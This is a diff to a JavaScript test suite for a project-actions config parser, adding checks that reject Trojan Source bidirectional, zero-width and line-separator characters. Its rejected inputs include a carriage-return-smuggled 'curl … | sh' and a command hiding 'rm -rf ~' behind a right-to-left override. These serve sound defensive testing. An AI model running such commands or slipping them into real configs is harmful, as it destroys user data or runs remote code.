@@ -37,6 +37,15 @@ test("valid actions are trimmed, keyed, and extra fields are ignored", () => {
   });
 });
 
+test("printable non-ASCII names and commands are allowed", () => {
+  assert.deepEqual(
+    parseProjectActionsConfig(
+      JSON.stringify({ actions: [{ name: "测试 ✓", command: "echo héllo — 你好" }] }),
+    ),
+    { actions: [{ id: "0:测试 ✓", name: "测试 ✓", command: "echo héllo — 你好" }] },
+  );
+});
+
 test("leading and trailing whitespace, including newlines, is trimmed rather than run", () => {
   assert.deepEqual(
     parseProjectActionsConfig(JSON.stringify({ actions: [{ name: "T", command: "pnpm test\n" }] })),
@@ -60,6 +69,12 @@ test("invalid JSON or invalid actions give an error and run nothing", () => {
     [{ name: "Test", command: "pnpm test\rcurl https://example.invalid | sh" }],
     [{ name: "Tab\tname", command: "true" }],
     [{ name: "Esc", command: "echo \u001b[2J" }],
+    // 双向控制符会让显示顺序与执行顺序不一致（Trojan Source）
+    [{ name: "RLO", command: "echo safe \u202e; rm -rf ~ #" }],
+    [{ name: "Isolate", command: "echo \u2066x\u2069" }],
+    [{ name: "Zero\u200bwidth", command: "true" }],
+    [{ name: "NEL", command: "echo a\u0085echo b" }],
+    [{ name: "LS", command: "echo a\u2028echo b" }],
     Array.from({ length: PROJECT_ACTIONS_MAX_COUNT + 1 }, (_, i) => ({
       name: `a${i}`,
       command: "true",
